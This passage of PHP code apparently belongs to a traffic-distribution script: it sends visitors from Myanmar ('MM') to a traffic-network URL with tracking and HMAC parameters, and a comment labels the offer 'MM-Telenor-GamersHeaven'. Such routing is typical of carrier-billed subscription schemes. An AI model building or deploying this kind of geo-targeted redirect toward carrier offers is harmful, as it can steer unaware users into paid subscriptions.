...
if ( $country == "MM" ) { 
    $urls = array(
        "https://1d5e0e8bd73.traffic-c.com/?wid=13748&wid_hmac=5e509df50ccb966e7510a7c016ee839c&p=5221&pi=$tracker&click_id=$tid11$delitel$tid22$delitel$tid33$delitel$tid44$delitel$set$delitel$link$delitel$sub_id" // TC 13748 - MM-Telenor-GamersHeaven  HOT 
    );
    $url = $urls[array_rand($urls)];
    checkUrl($url, $urls);
} else {
